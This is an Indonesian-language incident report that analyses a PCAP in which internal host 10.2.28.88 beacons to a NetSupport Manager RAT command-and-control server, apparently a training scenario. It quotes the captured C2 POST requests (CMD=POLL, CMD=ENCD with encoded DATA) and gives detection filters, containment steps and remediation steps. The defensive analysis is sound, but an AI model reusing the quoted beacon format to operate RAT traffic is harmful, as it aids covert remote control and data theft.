# Laporan Insiden Keamanan

## 1. Ringkasan Eksekutif

Analisis terhadap `lalu_lintas_jaringan.pcap` mengonfirmasi adanya komunikasi aktif antara host internal `10.2.28.88` dan infrastruktur Command and Control (C2) yang terkait dengan **NetSupport Manager RAT**.

Host internal melakukan koneksi TCP ke `45.131.214.85` melalui port `443`, lalu mengirimkan HTTP plaintext dengan User-Agent `NetSupport Manager/1.3`. Pola beacon periodik, respons HTTP `200 OK`, serta perintah `CMD=POLL` dan `CMD=ENCD` menunjukkan sesi C2 aktif.

**Host yang paling kuat terindikasi terinfeksi: `10.2.28.88`.**

---

## 2. Informasi Insiden

| Field | Nilai |
|---|---|
| Kategori | Remote Access Trojan / C2 communication |
| Malware terkait | NetSupport Manager RAT |
| Severity | High |
| Status | Confirmed compromise berdasarkan bukti jaringan |
| Waktu mulai aktivitas | 28 Februari 2026 19:55:51 UTC |
| Waktu aktivitas terakhir dalam PCAP | 1 Maret 2026 00:16:28 UTC |
| Durasi teramati | Sekitar 4 jam 20 menit |
| Host terinfeksi | `10.2.28.88` |
| MAC address | `00:19:d1:b2:4d:ad` |
| Domain AD | `EASYAS123` |

---

## 3. Lingkungan Jaringan

| Komponen | Nilai |
|---|---|
| Segmen LAN | `10.2.28.0/24` |
| Rentang host | `10.2.28.0` – `10.2.28.255` |
| Domain | `easyas123.tech` |
| Nama environment AD | `EASYAS123` |
| Domain Controller | `10.2.28.2` / `EASYAS123-DC` |
| Gateway | `10.2.28.1` |
| Broadcast | `10.2.28.255` |

---

## 4. Indicator of Compromise (IOC)

### 4.1 IP dan Port

```text
45.131.214.85
TCP/443
10.2.28.88:51912
```

### 4.2 HTTP Indicator

```text
http://45.131.214.85/fakeurl.htm
NetSupport Manager/1.3
NetSupport Gateway/1.92 (Windows NT)
```

### 4.3 Perintah C2

```text
CMD=POLL
CMD=ENCD
```

### 4.4 Identitas Layer 2

```text
MAC: 00:19:d1:b2:4d:ad
```

---

## 5. Temuan Analisis PCAP

### 5.1 Host Terinfeksi

Host internal yang berkomunikasi dengan IP C2 adalah:

```text
10.2.28.88
```

MAC address yang teramati terkait host tersebut:

```text
00:19:d1:b2:4d:ad
```

Tidak ditemukan komunikasi dengan IP C2 dari host internal lain pada trafik yang dianalisis.

### 5.2 Sesi Jaringan

| Arah | Endpoint | Detail |
|---|---|---|
| Outbound | `10.2.28.88:51912` → `45.131.214.85:443` | HTTP POST C2 |
| Inbound | `45.131.214.85:443` → `10.2.28.88:51912` | Respons C2 |

Temuan statistik:

- Total paket TCP IPv4 dalam PCAP: `12.544`
- Paket yang cocok dengan IP C2 dan TCP/443: `550`
- Payload aplikasi dari host internal menuju C2: `275`
- Endpoint internal terkait C2: `10.2.28.88:51912`
- Aktivitas menggunakan koneksi TCP persisten/keep-alive.
- Beacon berlangsung kira-kira setiap 60 detik.

### 5.3 Waktu Aktivitas

| Aktivitas | Timestamp UTC |
|---|---|
| Komunikasi pertama | `2026-02-28 19:55:51.523688` |
| POST C2 pertama | `2026-02-28 19:55:51.530968` |
| Aktivitas terakhir | `2026-03-01 00:16:28.527212` |

### 5.4 Respons C2

Server mengembalikan respons HTTP `200 OK` dengan header:

```http
Server: NetSupport Gateway/1.92 (Windows NT)
```

Respons sukses memperkuat indikasi bahwa koneksi ke C2 diterima dan diproses.

---

## 6. Bukti Payload

Payload pertama yang teridentifikasi:

```http
POST http://45.131.214.85/fakeurl.htm HTTP/1.1
User-Agent: NetSupport Manager/1.3
Content-Type: application/x-www-form-urlencoded
Content-Length:    22
Host: 45.131.214.85
Connection: Keep-Alive

CMD=POLL
INFO=1
ACK=1
```

Payload lain menggunakan perintah `CMD=ENCD`:

```http
POST http://45.131.214.85/fakeurl.htm HTTP/1.1
User-Agent: NetSupport Manager/1.3
Content-Type: application/x-www-form-urlencoded
Host: 45.131.214.85
Connection: Keep-Alive

CMD=ENCD
ES=1
DATA=<data encoded/encrypted>
```

Field `DATA` berisi data biner/encoded yang tidak terbaca sebagai plaintext. Hal ini konsisten dengan pertukaran data C2 yang telah dienkode atau dienkripsi.

---

## 7. Host Lain yang Teramati

Host `10.2.28.88` juga membuat sejumlah koneksi HTTPS ke alamat lain, termasuk alamat Microsoft/Azure, CDN, dan layanan internet umum. Koneksi-koneksi tersebut tidak otomatis dinyatakan malicious berdasarkan PCAP ini.

Koneksi yang paling relevan dengan alert NetSupport adalah:

```text
10.2.28.88:51912 → 45.131.214.85:443
```

Tidak ada bukti PCAP yang menunjukkan bahwa komponen berikut terinfeksi:

```text
10.2.28.1   # Gateway
10.2.28.2   # Domain Controller EASYAS123-DC
```

Catatan: ketiadaan bukti pada PCAP bukan bukti bahwa host tersebut pasti bersih.

---

## 8. Analisis dan Penilaian

### 8.1 Kesimpulan Teknis

Bukti jaringan menunjukkan:

1. Host internal `10.2.28.88` menginisiasi koneksi ke IP eksternal yang ditandai sebagai NetSupport Manager RAT.
2. Trafik menggunakan User-Agent khusus `NetSupport Manager/1.3`.
3. Host mengirimkan perintah `CMD=POLL`, pola umum beacon/check-in.
4. Host mengirimkan `CMD=ENCD` dengan data encoded/encrypted.
5. C2 memberikan respons `HTTP/1.1 200 OK`.
6. Komunikasi berulang setiap sekitar satu menit selama beberapa jam.

### 8.2 Tingkat Keyakinan

**Tinggi** untuk kesimpulan bahwa `10.2.28.88` menjalankan atau berkomunikasi melalui komponen NetSupport Manager.

**Belum dapat dipastikan dari PCAP saja:**

- Nama komputer/hostname Windows.
- Username yang sedang login.
- File awal atau vektor infeksi.
- Apakah attacker menjalankan perintah tambahan di host.
- Apakah host lain ikut terkompromi di luar periode capture.

---

## 9. Tindakan Containment Segera

1. Isolasi `10.2.28.88` dari jaringan menggunakan EDR, NAC, switch, atau firewall.
2. Blokir komunikasi ke:

   ```text
   45.131.214.85/32
   ```

3. Blokir koneksi TCP outbound menuju `45.131.214.85:443`.
4. Jangan langsung mematikan host sebelum volatile evidence dikumpulkan.
5. Pertahankan salinan PCAP asli sebagai evidence read-only.
6. Catat waktu containment dan perubahan firewall/NAC.

---

## 10. Prosedur Forensik Host

Sebelum remediation, kumpulkan:

- Memory dump.
- Daftar proses aktif dan command line.
- Koneksi jaringan aktif.
- Windows Services.
- Scheduled Tasks.
- Registry Run Keys.
- Startup folder.
- Prefetch dan Amcache.
- File executable/DLL terkait NetSupport.
- Windows Event Logs.
- EDR telemetry.
- Browser download history.
- DHCP, ARP, switch CAM, dan log autentikasi AD.

Gunakan data DHCP, switch, EDR, atau AD untuk memetakan `10.2.28.88` ke hostname dan user.

---

## 11. Threat Hunting

Cari IOC berikut di firewall, proxy, DNS, EDR, SIEM, dan endpoint:

```text
45.131.214.85
NetSupport Manager/1.3
NetSupport Gateway/1.92
/fakeurl.htm
CMD=POLL
CMD=ENCD
00:19:d1:b2:4d:ad
```

Contoh filter Wireshark:

```text
ip.addr == 45.131.214.85 && tcp.port == 443
```

```text
ip.addr == 10.2.28.88 && ip.addr == 45.131.214.85
```

```text
http.user_agent contains "NetSupport Manager"
```

Contoh filter Zeek/HTTP log secara konseptual:

```text
user_agent contains "NetSupport Manager"
```

---

## 12. Remediation

Setelah evidence collection selesai:

1. Reimage `10.2.28.88` dari trusted image.
2. Jangan hanya menghapus executable RAT.
3. Terapkan patch OS dan aplikasi.
4. Jalankan full EDR/antivirus scan.
5. Reset password akun yang digunakan pada host.
6. Reset kredensial privileged jika host memiliki akses administratif.
7. Periksa aktivitas lateral movement ke host lain.
8. Validasi ulang host sebelum dikembalikan ke LAN.
9. Pertahankan blokir IOC pada perimeter dan endpoint.

---

## 13. Rekomendasi Deteksi SIEM

Buat alert untuk kombinasi berikut:

- HTTP User-Agent mengandung `NetSupport Manager`.
- Outbound connection ke `45.131.214.85`.
- HTTP POST ke path `/fakeurl.htm`.
- Periodic beacon TCP/443 dari workstation ke IP berisiko.
- Payload HTTP plaintext pada port yang biasanya digunakan untuk TLS.
- Kombinasi `CMD=POLL` atau `CMD=ENCD`.

Prioritaskan alert jika sumber berada dalam subnet `10.2.28.0/24` dan bukan server yang telah diotorisasi.

---

## 14. Kesimpulan Akhir

PCAP mengidentifikasi `10.2.28.88` sebagai host internal yang terinfeksi atau menjalankan NetSupport Manager RAT. Host tersebut mempertahankan komunikasi C2 aktif dengan `45.131.214.85` melalui TCP/443 sejak `28 Februari 2026 19:55:51 UTC` hingga setidaknya `1 Maret 2026 00:16:28 UTC`.

Tindakan prioritas:

1. Isolasi `10.2.28.88`.
2. Blokir `45.131.214.85`.
3. Kumpulkan volatile evidence.
4. Identifikasi hostname dan user.
5. Hunt IOC di seluruh environment `EASYAS123`.
6. Reimage host setelah forensik selesai.

---

## 15. Evidence File

File sumber analisis:

```text
lalu_lintas_jaringan.pcap
```

File analisis lokal:

```text
analyze_pcap.py
evidence.py
```
